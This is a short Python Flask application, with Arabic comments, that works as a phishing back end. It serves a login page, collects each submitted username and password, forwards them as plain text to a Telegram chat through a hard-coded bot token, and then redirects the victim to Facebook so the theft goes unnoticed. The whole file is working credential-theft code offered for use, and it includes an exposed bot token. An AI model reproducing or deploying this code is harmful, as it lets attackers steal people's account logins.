from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# معلومات البوت
TELEGRAM_TOKEN = "7751115733:AAE5s_LjZfXtJlNm25J6cmdrGosJ-CFJZnQ"
TELEGRAM_CHAT_ID = "5309697442"

@app.route("/")
def home():
    return open("index.html").read()

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    # إرسال البيانات إلى تيليجرام
    message = f"اسم المستخدم: {username}\nكلمة المرور: {password}"
    requests.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", params={
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    })

    # إعادة توجيه المستخدم إلى فيسبوك
    return redirect("https://www.facebook.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
